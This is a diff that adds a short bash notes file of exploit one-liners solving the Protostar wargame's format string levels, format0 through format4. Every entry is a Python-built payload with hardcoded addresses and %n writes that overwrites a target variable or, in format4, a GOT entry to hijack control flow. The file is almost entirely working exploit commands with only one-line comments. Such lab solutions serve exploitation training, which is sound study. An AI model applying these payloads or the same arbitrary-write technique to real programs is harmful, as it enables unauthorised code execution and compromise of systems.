@@ -1,0 +1,21 @@
+#shell : bash
+
+Format0
+# simple format string bug 
+/opt/protostar/bin/format0 `(python -c 'print "%64d" + "\xef\xbe\xad\xde"')`
+
+Format1
+# global variable target -> 4 (data_add)
+/opt/protostar/bin/format1 `(python -c 'print "AA\x38\x96\x04\x08DD" + "%133$n" ')`
+
+Format2
+# format string bug with buffer
+(python -c 'print "\xe4\x96\x04\x08" +"%60c" +"%4$n"' ; cat) |  /opt/protostar/bin/format2
+
+Format3
+# format string bug with buffer
+(python -c 'print "\xf4\x96\x04\x08" +"%16930112c" + "%12$n"' ; cat) |  /opt/protostar/bin/format3
+
+Format4
+# simple got overwrite and formatstirng
+(python -c 'print "\x24\x97\x04\x08" +"%134513840c" +"%4$n"') | /opt/protostar/bin/format4
